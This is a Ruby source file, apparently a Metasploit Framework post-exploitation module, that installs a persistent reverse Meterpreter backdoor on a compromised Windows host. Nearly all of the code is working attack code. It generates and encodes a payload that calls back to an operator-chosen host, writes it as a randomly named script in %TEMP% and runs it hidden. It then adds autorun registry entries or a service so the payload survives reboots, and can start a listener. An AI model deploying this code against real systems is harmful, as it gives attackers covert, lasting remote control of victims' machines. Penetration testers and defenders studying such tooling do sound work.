##
# ## This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/file'
require 'msf/core/post/windows/priv'
require 'msf/core/post/windows/registry'
require 'msf/core/post/windows/services'

class Metasploit3 < Msf::Post

  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::Services

  def initialize(info={})
    super(
        Msf::Module::ModuleInfo.update!(
            info,
            'Name'          => 'Windows Manage Persistent Payload Installer',
            'Description'   => %q{
              This Module will create a boot persistent reverse Meterpreter session by
              installing on the target host the payload as a script that will be executed
              at user logon or system startup depending on privilege and selected startup
              method.

              REXE mode will transfer a binary of your choosing to remote host to be
              used as a payload.
            },
            'License'       => MSF_LICENSE,
            'Arch' => ARCH_X86,
            'Author'        =>
                [
                    'Carlos Perez <carlos_perez[at]darkoperator.com>',
                    'Merlyn drforbin Cousins <drforbin6[at]gmail.com>'
                ],
            'Platform'      => [ 'Windows' ],
            'Actions'       => [['TEMPLATE'], ['REXE']],
            'DefaultAction' => 'TEMPLATE',
            'SessionTypes'  => [ 'meterpreter' ]
        )
    )

    register_options(
      [
        OptAddress.new('LHOST', [true, 'IP for persistent payload to connect to.']),
        OptInt.new('LPORT', [true, 'Port for persistent payload to connect to.']),
        OptInt.new('DELAY', [true, 'Delay in seconds for persistent payload to reconnect.', 5]),
        OptEnum.new('STARTUP', [true, 'Startup type for the persistent payload.', 'USER', ['USER','SYSTEM','SERVICE']]),
        OptBool.new('HANDLER', [ false, 'Start a Multi/Handler to Receive the session.', true]),
        OptString.new('TEMPLATE', [false, 'Alternate template Windows PE File to use.']),
        OptString.new('REXE',[false, 'The remote executable to use.','']),
        OptString.new('REXENAME',[false, 'The name to call exe on remote system','']),
        OptEnum.new('PAYLOAD_TYPE', [true, 'Meterpreter Payload Type.', 'TCP',['TCP','HTTP','HTTPS']])
      ], self.class)

    register_advanced_options(
      [
        OptString.new('OPTIONS', [false, "Comma separated list of additional options for payload if needed in \'opt=val,opt=val\' format.",""]),
        OptString.new('ENCODER', [false, "Encoder name to use for encoding.",]),
        OptInt.new('ITERATIONS', [false, 'Number of iterations for encoding.']),
      ], self.class)
  end

  # Run Method for when run command is issued
  #-------------------------------------------------------------------------------
  def run
    print_status("Running module against #{sysinfo['Computer']}")

    # Set vars
    rexe = data_store['REXE']
    rexename = data_store['REXENAME']
    lhost = data_store['LHOST']
    lport = data_store['LPORT']
    delay = data_store['DELAY']
    encoder_reference_name = data_store['ENCODER']
    iterations = data_store['ITERATIONS']
    @clean_up_rc = ""
    host,port = session.session_host, session.session_port
    payload_reference_name = "windows/meterpreter/reverse_tcp"

    if  data_store['ACTION'] == 'TEMPLATE'
      # Check that if a template is provided that it actually exists
      if data_store['TEMPLATE']
        if not ::File.exists?(data_store['TEMPLATE'])
          print_error "Template PE File does not exists!"
          return
        else
          template_pe = data_store['TEMPLATE']
        end
      end

      # Set the proper payload
      case data_store['PAYLOAD_TYPE']
      when /TCP/i
        payload_reference_name = "windows/meterpreter/reverse_tcp"
      when /HTTP/i
        payload_reference_name = "windows/meterpreter/reverse_http"
      when /HTTPS/i
        payload_reference_name = "windows/meterpreter/reverse_https"
      end

      # Create payload and script
      payload_instance = create_payload(payload_reference_name, lhost, lport)
      encoded = generate_and_encode_payload(payload_instance, encoder_reference_name, iterations)
      script = create_script(delay, template_pe, encoded)
      script_on_target = write_script_to_target(script)
    else
      if data_store['REXE'].nil? or data_store['REXE'].empty?
        print_error("Please define REXE")
        return
      end

      if data_store['REXENAME'].nil? or data_store['REXENAME'].empty?
        print_error("Please define REXENAME")
        return
      end

      if not ::File.exist?(data_store['REXE'])
        print_error("Rexe file does not exist!")
        return
      end

      encoded = create_payload_from_file(rexe)
      script_on_target = write_exe_to_target(encoded,rexename)
    end


    # Start handler if set
    create_multihand(payload_reference_name, lhost, lport) if data_store['HANDLER']

    # Initial execution of script
    target_exec(script_on_target)

    case data_store['STARTUP']
    when /USER/i
      write_to_reg("HKCU",script_on_target)
    when /SYSTEM/i
      write_to_reg("HKLM",script_on_target)
    when /SERVICE/i
      install_as_service(script_on_target)
    end

    clean_rc = log_file()
    file_local_write(clean_rc,@clean_up_rc)
    print_status("Cleanup Meterpreter RC File: #{clean_rc}")

    report_note(:host => host,
      :type => "host.persistance.cleanup",
      :data => {
        :local_id => session.sid,
        :stype => session.type,
        :desc => session.info,
        :platform => session.platform,
        :via_payload => session.via_payload,
        :via_exploit => session.via_exploit,
        :created_at => Time.now.utc,
        :commands =>  @clean_up_rc
      }
    )
  end

  # Generate encoded payload.
  #
  # @param payload_instance [Msf::Payload] a payload to generate and encode.
  # @param encoder_reference_name [String, nil] `Mdm::Module::Class#reference_name` for encoder that should encode the
  #   generated payload.
  # @param iterations [Integer] The number of times to encode the generated payload.
  # @return [String] the encoded generated payload
  def generate_and_encode_payload(payload_instance, encoder_reference_name, iterations)
    encoded = payload_instance.generate

    if encoder_reference_name
      if encoder_compatible_with_payload?(payload_instance, encoder_reference_name)
        print_status("Encoding with #{encoder_reference_name}")
        enc = framework.encoders.create(encoder_reference_name)

        (1..iterations).each do |i|
          print_status("\tRunning iteration #{i}")
          encoded = enc.encode(encoded, nil, nil, "Windows")
        end
      end
    end

    encoded
  end

  # @note This should allow to adapt to new encoders if they appear with out having to have a static whitelist.
  #
  # Check if `encoder_reference_name` specified is in the compatible encoders for `payload_instance`
  #
  # @param payload_instance [Msf::Payload] a payload instance whose encoder compatibility to check.
  # @return [false] if `encoder_reference_name` is incompatible with `payload_instance`.
  # @return [true] if `encoder_reference_name` is compatible with `payload_instance`.
  def encoder_compatible_with_payload?(payload_instance, encoder_reference_name)
    reference_name = encoder_reference_name.strip
    payload_instance.compatible_cache_encoder_instances.where(reference_name: reference_name).exists?
  end

  # Create a payload given a name, lhost and lport, additional options
  #-------------------------------------------------------------------------------
  def create_payload(name, lhost, lport)

    pay = session.framework.payloads.create(name)
    pay.data_store['LHOST'] = lhost
    pay.data_store['LPORT'] = lport
    # Validate the options for the module
    pay.options.validate(pay.data_store)
    return pay

  end

  # Function for Creating persistent script
  #-------------------------------------------------------------------------------
  def create_script(delay,altexe,raw)
    if not altexe.nil?
      vbs = ::Msf::Util::EXE.to_win32pe_vbs(session.framework, raw, {:persist => true, :delay => delay, :template => altexe})
    else
      vbs = ::Msf::Util::EXE.to_win32pe_vbs(session.framework, raw, {:persist => true, :delay => delay})
    end
    print_status("Persistent agent script is #{vbs.length} bytes long")
    return vbs
  end

  # Function for creating log folder and returning log path
  #-------------------------------------------------------------------------------
  def log_file(log_path = nil)
    #Get hostname
    host = session.sys.config.sysinfo["Computer"]

    # Create Filename info to be appended to downloaded files
    filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")

    # Create a directory for the logs
    if log_path
      logs = ::File.join(log_path, 'logs', 'persistence', Rex::FileUtils.clean_path(host + filenameinfo) )
    else
      logs = ::File.join(Msf::Config.log_directory, 'persistence', Rex::FileUtils.clean_path(host + filenameinfo) )
    end

    # Create the log directory
    ::FileUtils.mkdir_p(logs)

    #logfile name
    logfile = logs + ::File::Separator + Rex::FileUtils.clean_path(host + filenameinfo) + ".rc"
    return logfile
  end

  # Function for writing script to target host
  #-------------------------------------------------------------------------------
  def write_script_to_target(vbs)
    tempdir = session.fs.file.expand_path("%TEMP%")
    tempvbs = tempdir + "\\" + Rex::Text.rand_text_alpha((rand(8)+6)) + ".vbs"
    fd = session.fs.file.new(tempvbs, "wb")
    fd.write(vbs)
    fd.close
    print_good("Persistent Script written to #{tempvbs}")
    @clean_up_rc << "rm #{tempvbs}\n"
    return tempvbs
  end

  # Method for checking if a listener for a given IP and port is present
  # will return true if a conflict exists and false if none is found
  #-------------------------------------------------------------------------------
  def check_for_listner(lhost,lport)
    conflict = false
    client.framework.jobs.each do |k,j|
      if j.name =~ / multi\/handler/
        current_id = j.jid
        current_lhost = j.ctx[0].data_store["LHOST"]
        current_lport = j.ctx[0].data_store["LPORT"]
        if lhost == current_lhost and lport == current_lport.to_i
          print_error("Job #{current_id} is listening on IP #{current_lhost} and port #{current_lport}")
          conflict = true
        end
      end
    end
    return conflict
  end

  # Starts a multi/handler session
  #-------------------------------------------------------------------------------
  def create_multihand(payload,lhost,lport)
    pay = session.framework.payloads.create(payload)
    pay.data_store['LHOST'] = lhost
    pay.data_store['LPORT'] = lport
    print_status("Starting exploit multi handler")
    if not check_for_listner(lhost,lport)
      # Set options for module
      mul = session.framework.exploits.create("multi/handler")
      mul.share_data_store(pay.data_store)
      mul.data_store['WORKSPACE'] = client.workspace
      mul.data_store['PAYLOAD'] = payload
      mul.data_store['EXITFUNC'] = 'thread'
      mul.data_store['ExitOnSession'] = false
      # Validate module options
      mul.options.validate(mul.data_store)
      # Execute showing output
      mul.exploit_simple(
          'Payload'     => mul.data_store['PAYLOAD'],
          'LocalInput'  => self.user_input,
          'LocalOutput' => self.user_output,
          'RunAsJob'    => true
        )
    else
      print_error("Could not start handler!")
      print_error("A job is listening on the same Port")
    end
  end

  # Function to execute script on target and return the PID of the process
  #-------------------------------------------------------------------------------
  def target_exec(script_on_target)
    print_status("Executing script #{script_on_target}")
    proc = data_store['ACTION'] == 'REXE' ? session.sys.process.execute(script_on_target, nil, {'Hidden' => true})\
    : session.sys.process.execute("cscript \"#{script_on_target}\"", nil, {'Hidden' => true})

    print_good("Agent executed with PID #{proc.pid}")
    @clean_up_rc << "kill #{proc.pid}\n"
    return proc.pid
  end

  # Function to install payload in to the registry HKLM or HKCU
  #-------------------------------------------------------------------------------
  def write_to_reg(key,script_on_target)
    nam = Rex::Text.rand_text_alpha(rand(8)+8)
    print_status("Installing into autorun as #{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{nam}")
    if(key)
      registry_setvaldata("#{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",nam,script_on_target,"REG_SZ")
      print_good("Installed into autorun as #{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{nam}")
    else
      print_error("Error: failed to open the registry key for writing")
    end
  end
  # Function to install payload as a service
  #-------------------------------------------------------------------------------
  def install_as_service(script_on_target)
    if  is_system? or is_admin?
      print_status("Installing as service..")
      nam = Rex::Text.rand_text_alpha(rand(8)+8)
      print_status("Creating service #{nam}")
      data_store['ACTION'] == 'REXE' ? service_create(nam, nam, "cmd /c \"#{script_on_target}\"") : service_create(nam, nam, "cscript \"#{script_on_target}\"")

      @clean_up_rc << "execute -H -f sc -a \"delete #{nam}\"\n"
    else
      print_error("Insufficient privileges to create service")
    end
  end


  # Function for writing executable to target host
  #-------------------------------------------------------------------------------
  def write_exe_to_target(vbs,rexename)
    tempdir = session.fs.file.expand_path("%TEMP%")
    tempvbs = tempdir + "\\" + rexename
    fd = session.fs.file.new(tempvbs, "wb")
    fd.write(vbs)
    fd.close
    print_good("Persistent Script written to #{tempvbs}")
    @clean_up_rc << "rm #{tempvbs}\n"
    return tempvbs
  end

  def create_payload_from_file(exec)
    print_status("Reading Payload from file #{exec}")
    return ::IO.read(exec)
  end

end
